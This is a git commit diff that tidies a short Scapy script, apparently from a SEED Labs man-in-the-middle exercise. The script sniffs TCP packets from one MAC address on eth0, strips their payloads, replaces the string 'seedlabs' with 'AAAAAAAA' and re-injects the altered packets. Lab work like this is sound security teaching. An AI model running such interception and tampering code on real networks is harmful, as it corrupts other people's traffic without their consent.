a990d444e6cc9d1cae38ca07b063f98657f8f49e
ayhamibdah <ayhamibdah333@gmail.com>
2025-05-15 17:15:42 +0300

    Update icmp2.py

--- icmp2.py
+++ icmp2.py
@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 from scapy.all import * 
 def spoof_pkt (pkt) :
-  newpkt = IP(bytes (pkt [IP]))
-  del (newpkt. chksum)
-  del (newpkt [TCP] .payload)
-  del (newpkt [TCP] .chksum)
-  if pkt[TCP] .payload:
-    data = pkt[TCP] .payload. load
-    print("***%s, length: %d" % (data, len(data) ))
+  newpkt = IP(bytes (pkt[IP]))
+  del (newpkt.chksum)
+  del (newpkt[TCP].payload)
+  del (newpkt[TCP].chksum)
+  if pkt[TCP].payload:
+    data = pkt[TCP].payload.load
+    print("***%s, length: %d" % (data,len(data)))
 #Replace a pattern
-    newdata = data. replace(b'seedlabs', b'AAAAAAAA" )
+    newdata = data. replace(b'seedlabs', b'AAAAAAAA')
     send (newpkt/newdata)
   else:
     send (newpkt)
 f= 'tcp and ether src 02:42:0a: 09:00:05'
-pkt = sniff(iface='ethO', filter=f, prn=spoof_pkt)
+pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
